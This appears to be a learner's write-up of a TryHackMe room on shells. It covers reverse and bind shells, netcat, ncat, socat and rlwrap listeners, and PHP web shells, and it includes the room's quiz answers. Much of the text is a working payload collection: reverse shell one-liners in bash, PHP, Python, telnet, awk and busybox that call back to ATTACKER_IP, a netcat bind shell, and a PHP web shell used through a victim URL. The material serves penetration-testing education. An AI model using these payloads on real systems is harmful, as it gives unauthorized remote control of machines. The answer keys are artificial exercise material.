# 🐚 Shells Overview

Shells are one of the most important concepts in offensive security. They provide attackers and penetration testers with remote access to systems, allowing command execution, privilege escalation, persistence, pivoting, and post-exploitation activities.

Understanding how shells work is essential for both offensive and defensive security professionals because shell access is often the objective after successfully exploiting a target.

## 🧭 Task 2: Shell Overview

### 🐚 What is a Shell?

A shell is a program that allows users to interact with an operating system.

Most commonly, this interaction occurs through a command-line interface (CLI).

In cybersecurity, a shell usually refers to a remote command execution session obtained after compromising a system.

### ⚡ Common Uses of Shell Access

#### 🖥 Remote System Control

Execute commands remotely on a target system.

#### 🔓 Privilege Escalation

Attempt to obtain higher privileges after gaining initial access.

#### 📂 Data Exfiltration

Read and steal sensitive information.

#### 🔑 Persistence

Maintain long-term access by creating users, credentials, or backdoors.

#### 🧨 Post-Exploitation

Deploy malware, delete evidence, manipulate configurations, and more.

#### 🌐 Pivoting

Use a compromised machine to attack other systems on the network.

### ✅ Answers

**What is the command-line interface that allows users to interact with an operating system?**

```text
Shell
```

**What process involves using a compromised system as a launching pad to attack other machines in the network?**

```text
Pivoting
```

**What is a common activity attackers perform after obtaining shell access to escalate their privileges?**

```text
Privilege Escalation
```

## 🧭 Task 3: Reverse Shell

A Reverse Shell is one of the most common techniques used by attackers.

Instead of the attacker connecting to the target:

➡️ The target connects back to the attacker.

This often bypasses firewall restrictions because outbound connections are usually allowed.

### 🔄 How Reverse Shells Work

#### Step 1: Start a Listener

Attackers typically use Netcat.

```bash
nc -lvnp 443
```

### Flag Breakdown

| Flag | Meaning                |
| ---- | ---------------------- |
| `-l` | Listen mode            |
| `-v` | Verbose output         |
| `-n` | No DNS resolution      |
| `-p` | Specify listening port |

### Common Listener Ports

Attackers often use common service ports to blend with normal traffic:

```text
53
80
443
8080
139
445
```

### ⚙ Reverse Shell Payload Example

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

### 🔍 Payload Breakdown

#### Remove Existing Pipe

```bash
rm -f /tmp/f
```

Deletes any existing FIFO.

#### Create Named Pipe

```bash
mkfifo /tmp/f
```

Creates a communication channel.

#### Read From Pipe

```bash
cat /tmp/f
```

Waits for commands.

#### Interactive Shell

```bash
bash -i 2>&1
```

Starts an interactive Bash shell.

#### Send Data to Attacker

```bash
nc ATTACKER_IP ATTACKER_PORT
```

Connects back to the attacker's listener.

#### Return Output

```bash
>/tmp/f
```

Sends command results back through the pipe.

### 🖥 Reverse Shell Connection

Listener:

```bash
nc -lvnp 443
```

Result:

```bash
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37]
target@tryhackme:~$
```

The attacker now controls the target system remotely.

### ✅ Answers

**What type of shell allows an attacker to execute commands remotely after the target connects back?**

```text
Reverse Shell
```

**What tool is commonly used to set up a listener for a reverse shell?**

```text
Netcat
```

## 🧭 Task 4: Bind Shell

A Bind Shell works opposite to a Reverse Shell.

Instead of connecting back:

➡️ The target listens on a port.

➡️ The attacker connects to that port.


### 🔄 How Bind Shells Work

#### Start Bind Shell on Target

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f
```

### 🔍 Important Part

```bash
nc -l 0.0.0.0 8080
```

This tells Netcat to:

* Listen on all interfaces
* Wait on port 8080

### Connect From Attacker

```bash
nc -nv TARGET_IP 8080
```

#### Example Output

```bash
(UNKNOWN) [10.10.13.37] 8080 open
target@tryhackme:~$
```

### ⚠ Important Note

Ports below:

```text
1024
```

require elevated privileges.

### ✅ Answers

**What type of shell opens a specific port on the target for incoming connections from the attacker?**

```text
Bind Shell
```

**Listening below which port number requires root access or privileged permissions?**

```text
1024
```

## 🧭 Task 5: Shell Listeners

Attackers require listeners to interact with incoming shells.

### 🔧 Rlwrap

Rlwrap improves shell usability.

Example:

```bash
rlwrap nc -lvnp 443
```

#### Benefits

* Command history
* Arrow key support
* Better shell interaction

### 🔧 Ncat

Ncat is an enhanced version of Netcat from the Nmap project.

#### Standard Listener

```bash
ncat -lvnp 443
```

#### SSL Listener

```bash
ncat --ssl -lvnp 443
```

Benefits:

* Encrypted communications
* Harder to inspect traffic

### 🔧 Socat

Socat is a powerful networking utility.

#### Listener Example

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

### Explanation

| Option           | Purpose                |
| ---------------- | ---------------------- |
| `-d -d`          | Verbose output         |
| `TCP-LISTEN:443` | Listen on TCP port 443 |
| `STDOUT`         | Display incoming data  |

### ✅ Answers

**Which flexible networking tool allows you to create a socket connection between two data sources?**

```text
socat
```

**Which command-line utility provides readline-style editing and command history for programs that lack it?**

```text
rlwrap
```

**What is the improved version of Netcat distributed with the Nmap project?**

```text
ncat
```

## 🧭 Task 6: Shell Payloads

Shell payloads expose a command shell over the network.

These payloads are commonly used after exploiting a vulnerability.

### 🐧 Bash Reverse Shells

#### Basic Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

#### Bash Readline Reverse Shell

```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

#### Bash FD 196 Reverse Shell

```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

#### Bash FD 5 Reverse Shell

```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

### 🐘 PHP Reverse Shells

PHP offers several functions capable of executing commands.

#### Using exec()

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

#### Using shell_exec()

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

#### Using system()

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```

#### Using passthru()

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

#### Using popen()

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3","r");'
```

### 🐍 Python Reverse Shells

#### Environment Variable Method

```bash
export RHOST="ATTACKER_IP"
export RPORT=443

python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

#### subprocess Module Method

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
```

#### Short Python Reverse Shell

```bash
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### 🔧 Other Reverse Shells

#### Telnet

```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

#### AWK

```bash
awk 'BEGIN {s="/inet/tcp/0/ATTACKER_IP/443"; while(42){do{printf "shell>" |& s; s |& getline c; if(c){while((c |& getline)>0) print $0 |& s; close(c);}} while(c!="exit") close(s);}}' /dev/null
```

#### BusyBox

```bash
busybox nc ATTACKER_IP 443 -e sh
```

### ✅ Answers

**Which Python module is commonly used for managing shell commands and establishing reverse shell connections?**

```text
subprocess
```

**What scripting language uses exec, shell_exec, system, passthru, and popen functions for reverse shells?**

```text
php
```

**Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?**

```text
python
```

## 🧭 Task 7: Web Shell

A Web Shell is a malicious script uploaded to a web server that allows remote command execution through a web browser.

Attackers commonly deploy web shells after exploiting:

* Unrestricted File Upload
* File Inclusion
* Command Injection
* Weak Credentials

#### 🐘 Example PHP Web Shell

```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

Save as:

```text
shell.php
```

### 🌐 Executing Commands

Upload the file and browse to:

```text
http://victim.com/uploads/shell.php
```

Run a command:

```text
http://victim.com/uploads/shell.php?cmd=whoami
```

Output:

```text
www-data
```

### 🛠 Popular Web Shells

#### p0wny-shell

Minimalistic PHP web shell.

#### b374k Shell

Advanced file manager and command execution shell.

#### c99 Shell

One of the most famous PHP web shells.

### ✅ Answers

**What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?**

```text
Unrestricted File Upload
```

**What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?**

```text
Web Shell
```

## 📝 Key Takeaways

* Shells provide command execution on remote systems.
* Reverse shells initiate connections from target to attacker.
* Bind shells expose a listening port on the target.
* Netcat is the most common shell listener.
* Ncat supports SSL-encrypted shell connections.
* Socat provides powerful socket communication capabilities.
* PHP, Python, Bash, AWK, Telnet, and BusyBox can all be used to create reverse shells.
* Web shells allow command execution through a web server.
* Unrestricted file uploads often lead to web shell deployment.
* Shell access is frequently the gateway to privilege escalation, persistence, and lateral movement.
